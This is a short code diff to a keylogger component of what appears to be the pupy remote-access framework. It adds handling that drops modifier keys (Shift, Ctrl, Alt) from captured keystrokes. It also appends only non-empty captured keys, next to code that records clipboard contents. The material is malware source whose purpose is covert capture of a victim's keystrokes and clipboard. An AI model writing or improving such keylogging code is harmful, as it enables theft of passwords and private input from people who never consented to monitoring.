@@ -202,6 +202,9 @@ class KeyLogger(pupy.Task):
                 if not modifiers:
                     key = '[' + key + ']'
 
+        elif kbdllhookstruct.vkCode >= VK_LSHIFT and kbdllhookstruct.vkCode <= VK_RMENU:
+            key = ''
+
         else:
             #https://msdn.microsoft.com/en-us/library/windows/desktop/ms646322(v=vs.85).aspx
             r = ToUnicodeEx(
@@ -266,4 +269,5 @@ class KeyLogger(pupy.Task):
 
             self.last_clipboard = paste
 
-        self.append(hooked_key)
+        if hooked_key:
+            self.append(hooked_key)
